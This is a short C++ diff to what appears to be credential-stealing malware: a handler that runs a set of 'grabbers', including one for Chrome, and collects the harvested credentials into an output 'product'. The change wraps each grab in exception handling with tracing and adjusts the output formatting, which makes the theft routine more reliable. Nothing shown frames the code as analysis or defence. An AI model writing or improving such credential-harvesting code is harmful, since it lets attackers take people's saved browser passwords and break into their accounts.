@@ -1,5 +1,6 @@
 ﻿#include "GetAllCredentialsHandler.hpp"
 
+#include "Trace.hpp"
 #include "../Grabbers/ChromeCredentialsGrabber.hpp"
 #include "Products/TextTypedProduct.hpp"
 #include "Utils/Strings.hpp"
@@ -26,7 +27,13 @@ void GetAllCredentialsHandler::run()
 
 	for (const auto& grabber : make_grabbers())
 	{
-		std::optional<Credentials> credentials = grabber->grab_credentials();
+		std::optional<Credentials> credentials = std::nullopt;
+		try
+		{
+			credentials = grabber->grab_credentials();
+		}
+		CATCH_AND_TRACE();
+
 		product.append(format_source(grabber->source()) + SUFFIX);
 
 		if (credentials.has_value())
@@ -38,7 +45,7 @@ void GetAllCredentialsHandler::run()
 		}
 		else
 		{
-			product.append(L"[Not Supported]");
+			product.append(std::wstring{L"[Not Supported]"} + SUFFIX);
 		}
 
 		product.append(SUFFIX);
